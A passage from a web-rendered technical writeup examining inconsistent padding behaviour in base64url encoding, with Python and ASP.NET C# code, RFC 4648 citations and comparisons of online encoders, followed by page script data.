</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        input_bytes </span><span class="token operator">+=</span><span class=""> </span><span class="token string">b&quot;=&quot;</span><span class=""> </span><span class="token operator">*</span><span class=""> </span><span class="token punctuation">(</span><span class="token number">4</span><span class=""> </span><span class="token operator">-</span><span class=""> rem</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token keyword">return</span><span class=""> base64</span><span class="token punctuation">.</span><span class="">urlsafe_b64decode</span><span class="token punctuation">(</span><span class="">input_bytes</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">base64url_encode</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword">return</span><span class=""> base64</span><span class="token punctuation">.</span><span class="">urlsafe_b64encode</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">replace</span><span class="token punctuation">(</span><span class="token string">b&quot;=&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">b&quot;&quot;</span><span class="token punctuation">)</span></code></pre></div></div>
<p>which, apart from actually <em>adding</em> padding to our input, just hooks into the Python <a href="https://docs.python.org/3/library/base64.html#base64.urlsafe_b64decode">standard library <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">urlsafe_b64</code> method</a>. Surprisingly, <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">base64.urlsafe_b64decode()</code> makes no mention of omitting padding characters!</p>
<p><img src="https://gist.github.com/user-attachments/assets/331cebcd-1238-432b-8142-e9998897b7ce" alt="image"/></p>
<p>Finally, what does the RFC say? According to the linked <a href="https://datatracker.ietf.org/doc/html/rfc4648#section-5">RFC 4648 section 5</a>,</p>
<p><img src="https://gist.github.com/user-attachments/assets/c06783cc-f3c4-4b7a-a6f5-c3e93f25e449" alt="image"/></p>
<p>so padding characters <em>can</em> be skipped? Sometimes?</p>
<p>And the padding issue seemingly isn&#x27;t just an MDN misunderstanding either; if you google &quot;base64 URL encoder&quot;, many sites (including the somewhat well-known <a href="https://www.base64encode.org/">base64encode.org</a>, but also the <a href="https://base64.guru/standards/base64url/encode">third result on google</a>, this <a href="https://www.npmjs.com/package/base64url">npm library</a>, and this <a href="https://medium.com/@bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26">random Medium article I came across</a>) will omit padding characters when encoding base64url:</p>
<img width="1434" height="895" alt="image" src="https://gist.github.com/user-attachments/assets/ac29cd97-1dd4-42ab-b135-fc945920cb99"/>
<p>But others, including the <a href="https://simplycalc.com/base64url-encode.php">first result that happened to come up on google</a>, don&#x27;t.</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class=""> base64</span><span class="token punctuation">.</span><span class="">urlsafe_b64encode</span><span class="token punctuation">(</span><span class="token string">b&#x27;aaaaaaa&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token string">b&#x27;YWFhYWFhYQ==&#x27;</span></code></pre></div></div>
<p>Hell, even the C# <a href="https://github.com/dotnet/dotnet/blob/b0f34d51fccc69fd334253924abd8d6853fad7aa/src/aspnetcore/src/Shared/WebEncoders/WebEncoders.cs#L288">standard library for ASP.NET</a> seems to drop padding characters when encoding:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (cs)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">    </span><span class="token keyword">public</span><span class=""> </span><span class="token keyword">static</span><span class=""> </span><span class="token return-type class-name keyword">int</span><span class=""> </span><span class="token function">Base64UrlEncode</span><span class="token punctuation">(</span><span class="token class-name keyword">byte</span><span class="token class-name punctuation">[</span><span class="token class-name punctuation">]</span><span class=""> input</span><span class="token punctuation">,</span><span class=""> </span><span class="token class-name keyword">int</span><span class=""> offset</span><span class="token punctuation">,</span><span class=""> </span><span class="token class-name keyword">char</span><span class="token class-name punctuation">[</span><span class="token class-name punctuation">]</span><span class=""> output</span><span class="token punctuation">,</span><span class=""> </span><span class="token class-name keyword">int</span><span class=""> outputOffset</span><span class="token punctuation">,</span><span class=""> </span><span class="token class-name keyword">int</span><span class=""> count</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">        ArgumentNullThrowHelper</span><span class="token punctuation">.</span><span class="token function">ThrowIfNull</span><span class="token punctuation">(</span><span class="">input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        ArgumentNullThrowHelper</span><span class="token punctuation">.</span><span class="token function">ThrowIfNull</span><span class="token punctuation">(</span><span class="">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token function">ValidateParameters</span><span class="token punctuation">(</span><span class="">input</span><span class="token punctuation">.</span><span class="">Length</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">nameof</span><span class="token punctuation">(</span><span class="">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> offset</span><span class="token punctuation">,</span><span class=""> count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        ArgumentOutOfRangeThrowHelper</span><span class="token punctuation">.</span><span class="token function">ThrowIfNegative</span><span class="token punctuation">(</span><span class="">outputOffset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token class-name keyword">var</span><span class=""> arraySizeRequired </span><span class="token operator">=</span><span class=""> </span><span class="token function">GetArraySizeRequiredToEncode</span><span class="token punctuation">(</span><span class="">count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">output</span><span class="token punctuation">.</span><span class="">Length </span><span class="token operator">-</span><span class=""> outputOffset </span><span class="token operator">&lt;</span><span class=""> arraySizeRequired</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">            </span><span class="token keyword">throw</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token constructor-invocation class-name">ArgumentException</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">                </span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">                    CultureInfo</span><span class="token punctuation">.</span><span class="">CurrentCulture</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">                    EncoderResources</span><span class="token punctuation">.</span><span class="">WebEncoders_InvalidCountOffsetOrLength</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">                    </span><span class="token keyword">nameof</span><span class="token punctuation">(</span><span class="">count</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">                    </span><span class="token keyword">nameof</span><span class="token punctuation">(</span><span class="">outputOffset</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">                    </span><span class="token keyword">nameof</span><span class="token punctuation">(</span><span class="">output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">                </span><span class="token keyword">nameof</span><span class="token punctuation">(</span><span class="">count</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class=""></span><span class="token preprocessor property">#</span><span class="token preprocessor property directive keyword">if</span><span class="token preprocessor property"> NETCOREAPP</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token keyword">return</span><span class=""> </span><span class="token function">Base64UrlEncode</span><span class="token punctuation">(</span><span class="">input</span><span class="token punctuation">.</span><span class="token function">AsSpan</span><span class="token punctuation">(</span><span class="">offset</span><span class="token punctuation">,</span><span class=""> count</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> output</span><span class="token punctuation">.</span><span class="token function">AsSpan</span><span class="token punctuation">(</span><span class="">outputOffset</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class=""></span><span class="token preprocessor property">#</span><span class="token preprocessor property directive keyword">else</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">        </span><span class="token comment">// Special-case empty input.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">count </span><span class="token operator">==</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">        </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">            </span><span class="token keyword">return</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">        </span><span class="token comment">// Use base64url encoding with no padding characters. See RFC 4648, Sec. 5.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">        </span><span class="token comment">// Start with default Base64 encoding.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">        </span><span class="token class-name keyword">var</span><span class=""> numBase64Chars </span><span class="token operator">=</span><span class=""> Convert</span><span class="token punctuation">.</span><span class="token function">ToBase64CharArray</span><span class="token punctuation">(</span><span class="">input</span><span class="token punctuation">,</span><span class=""> offset</span><span class="token punctuation">,</span><span class=""> count</span><span class="token punctuation">,</span><span class=""> output</span><span class="token punctuation">,</span><span class=""> outputOffset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">        </span><span class="token comment">// Fix up &#x27;+&#x27; -&gt; &#x27;-&#x27; and &#x27;/&#x27; -&gt; &#x27;_&#x27;. Drop padding characters.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">        </span><span class="token keyword">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token class-name keyword">var</span><span class=""> i </span><span class="token operator">=</span><span class=""> outputOffset</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">-</span><span class=""> outputOffset </span><span class="token operator">&lt;</span><span class=""> numBase64Chars</span><span class="token punctuation">;</span><span class=""> i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">        </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">            </span><span class="token class-name keyword">var</span><span class=""> ch </span><span class="token operator">=</span><span class=""> output</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">            </span><span class="token keyword">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">ch </span><span class="token operator">==</span><span class=""> </span><span class="token char">&#x27;+&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">            </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">                output</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token char">&#x27;-&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">            </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">            </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">ch </span><span class="token operator">==</span><span class=""> </span><span class="token char">&#x27;/&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">            </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">                output</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token char">&#x27;_&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">            </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">            </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">ch </span><span class="token operator">==</span><span class=""> </span><span class="token char">&#x27;=&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">            </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">                </span><span class="token comment">// We&#x27;ve reached a padding character; truncate the remainder.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">                </span><span class="token keyword">return</span><span class=""> i </span><span class="token operator">-</span><span class=""> outputOffset</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">            </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">54</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">        </span><span class="token keyword">return</span><span class=""> numBase64Chars</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class=""></span><span class="token preprocessor property">#</span><span class="token preprocessor property directive keyword">endif</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">    </span><span class="token punctuation">}</span></code></pre></div></div>
<p>(in C#&#x27;s <a href="https://github.com/dotnet/dotnet/blob/b0f34d51fccc69fd334253924abd8d6853fad7aa/src/aspnetcore/src/Shared/WebEncoders/WebEncoders.cs#L119"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">Base64UrlDecode</code></a>, a comment says to assume that the input contains no padding characters, though at first glance the method appears to work even if padding exists.)</p>
<p>All this to say, I think it&#x27;s a bit strange that there&#x27;s so much differing behavior around this spec.</p></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/9563dab5ba30607d.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n4:I[22016,[\"/_next/static/chunks/44838f11011a9f2d.js\"],\"\"]\n6:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"OutletBoundary\"]\n7:\"$Sreact.suspense\"\n9:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"ViewportBoundary\"]\nb:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"MetadataBoundary\"]\nd:I[68027,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n:HL[\"/_next/static/chunks/0ae28dad4c293945.css\",\"style\"]\n:HL[\"/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"FqfWdJCztNJa3QVRETEoN\",\"c\":[\"\",\"writeups\",\"1454cf6eebf96ea49d721401f0a51404\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"1454cf6eebf96ea49d721401f0a51404\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0ae28dad4c293945.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":[]}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/44838f11011a9f2d.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to 